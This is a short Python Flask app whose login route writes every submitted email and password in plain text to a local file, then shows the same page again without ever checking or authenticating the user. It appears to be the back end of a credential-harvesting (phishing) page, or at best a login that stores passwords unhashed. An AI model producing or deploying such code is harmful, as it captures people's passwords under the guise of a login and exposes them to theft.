from flask import Flask, render_template, request

app = Flask(__name__)

def create_user_file():
    with open('user.txt', 'w') as file:
        file.write('email,password\n')

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form['email']
    password = request.form['password']

    with open('user.txt', 'a') as file:
        file.write(f'{email},{password}\n')

    return render_template('index.html')

if __name__ == '__main__':
    create_user_file()
    app.run()